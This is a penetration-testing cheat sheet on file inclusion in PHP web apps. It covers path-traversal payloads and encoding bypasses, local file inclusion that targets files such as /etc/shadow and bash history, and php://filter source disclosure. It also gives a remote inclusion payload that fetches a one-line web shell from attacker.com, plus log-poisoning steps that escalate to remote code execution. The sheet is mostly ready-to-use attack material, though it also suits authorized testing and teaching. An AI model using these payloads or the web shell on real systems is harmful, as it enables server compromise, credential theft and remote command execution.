# File Inclusion

## 1. What is File Inclusion?

File inclusion vulnerabilities occur when user input is used to build file paths in server-side functions like `include()`, `require()`, or `file_get_contents()`. If not properly sanitized, attackers can:

- Read sensitive files (Local File Inclusion - LFI)
- Execute remote scripts (Remote File Inclusion - RFI)
- Traverse directories (Path Traversal)

---

## 2. Path Traversal

### Goal
Access files outside the web root using traversal sequences.

### Common Payloads
```
file=../../../../etc/passwd
file=..%2f..%2f..%2fetc%2fpasswd
file=....//....//etc/passwd
file=../../windows/win.ini
```

### Detection
- Look for parameters like `?file=`, `?lang=`, `?page=`
- Inject traversal payloads and observe if system files are returned
- Check for error messages revealing file paths

### Bypass Tricks

| Technique         | Payload Example                        |
|------------------|----------------------------------------|
| Double encoding   | `%252e%252e%252fetc%252fpasswd`        |
| Dot trick         | `/etc/passwd/.`                        |
| Unicode encoding  | `%c0%afetc%c0%afpasswd`                |
| Forced directory  | `lang=languages/../../../../etc/passwd`|

---

## 3. Local File Inclusion (LFI)

### Goal
Include and read local files via vulnerable `include()` or `require()`.

### Payloads
```
?lang=../../../../etc/passwd
?lang=../../../../etc/passwd%00
?lang=....//....//etc/passwd
?lang=php://filter/convert.base64-encode/resource=index.php
```

### Detection
- Inject junk → look for errors like `include(): failed to open stream`
- Try known file paths → check if contents are returned
- Observe if `.php` is auto-appended → try null byte (`%00`) to bypass

### Common Targets

| File Path                      | Description                          |
|--------------------------------|--------------------------------------|
| `/etc/passwd`                 | Linux user info                      |
| `/etc/shadow`                 | Encrypted passwords (root only)      |
| `/proc/self/environ`         | Environment variables                |
| `/var/log/apache2/access.log`| Log injection target                 |
| `/root/.bash_history`        | Command history                      |
| `c:\boot.ini`                | Windows boot info                    |

---

## 4. Remote File Inclusion (RFI)

### Goal
Execute remote code by including external scripts.

### Requirements
- `allow_url_fopen = On` in PHP config

### Payload
```
?lang=http://attacker.com/shell.txt
```

### Attacker File (`shell.txt`)
```php
<?php system($_GET['cmd']); ?>
```

### Result
RCE on the server when the file is fetched and executed.

---

## 5. LFI to RCE Techniques

| Technique           | Description                                                                 |
|---------------------|------------------------------------------------------------------------------|
| Log injection        | Inject PHP code via User-Agent → include log file via LFI                   |
| Session poisoning    | Inject payload into session file → include session via LFI                  |
| PHP wrappers         | Use `php://input`, `php://filter` to read or execute code                   |

### Log Poisoning Steps
1. Send request with malicious User-Agent:
   ```
   <?php system('id'); ?>
   ```
2. Include log file:
   ```
   ?file=/var/log/apache2/access.log
   ```

---

## 6. Detection Checklist

| Test Method         | What to Try                                      |
|---------------------|--------------------------------------------------|
| Error messages       | Inject junk → observe path errors                |
| File disclosure      | Try `/etc/passwd` → check for valid output       |
| Extension errors     | See if `.php` is auto-appended                   |
| Source directory     | Look for clues like `/var/www/html` in errors    |
| File wrappers        | `php://filter/resource=index.php`                |

---
## 7. Real-World Tips

- Always try both Unix and Windows file paths
- Look for filters that block `../` and try encoded or obfuscated paths
- Try extensionless inclusion or override `.php` using null byte if server allows
- Include wrappers like:
  ```
  ?file=php://filter/convert.base64-encode/resource=index.php
  ```
- If LFI is confirmed, try elevating to RCE using log injection or session hijack

  
  -----
  
